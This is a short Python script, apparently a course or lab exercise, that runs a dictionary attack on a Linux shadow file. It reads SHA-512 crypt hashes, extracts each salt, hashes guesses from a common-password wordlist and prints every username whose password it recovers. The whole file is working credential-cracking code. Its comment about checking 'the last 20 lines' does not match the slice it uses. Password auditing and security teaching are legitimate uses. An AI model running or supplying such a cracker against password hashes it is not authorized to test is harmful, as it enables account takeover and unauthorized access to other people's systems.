#!/usr/bin/env python3
# Script that performs a dictionary attack against known password hashes
# Needs a dictionary file, suggested to use https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials
# By Keegan 10/26

# imports
import os
from passlib.hash import sha512_crypt

# load dictionary function
def load_dictionary(file_name):
    # get current directory
    script_path = os.path.abspath(__file__)
    script_dir = os.path.dirname(script_path)
    # build file path
    file_path = os.path.join(script_dir, file_name)
    # open file for reading
    f = open(file_path, "r")
    # read contents
    contents = f.readlines()
    return contents

# create hash function
def create_hash(password, salt):
    hashed_pass = sha512_crypt.using(rounds=5000).hash(password, salt=salt)
    return hashed_pass

def split_shadow(shadowLine):
    # separate username from shadow line
    split_shadow_parts = shadowLine.split(":")
    # username
    shadow_user = split_shadow_parts[0]
    # shadow line
    user_shadow_line = split_shadow_parts[1]
    # salt
    user_salt = user_shadow_line.split("$")[2]
    return (shadow_user, user_salt, user_shadow_line)

# load dictionary
password_guesses = load_dictionary("top1000.txt")
shadow_file = load_dictionary("shadow")

# checks the last 20 lines of the shadow doc
for shadow_line in shadow_file[11:]:
    # captures the variables
    shadow_user, user_salt, user_shadow_line = split_shadow(shadow_line)
    password_found = False

# for each line/guess
    for password_guess in password_guesses:
        # hash guess
        hashed_guess = create_hash(password_guess.strip(), user_salt)
        # compare hash to guess
        if user_shadow_line == hashed_guess:
            # print guess
            print(shadow_user, password_guess.strip())
            # quit
            password_found = True
            break
        
    # print not found
    if password_found == False:
        print(f"Password not found for {shadow_user}")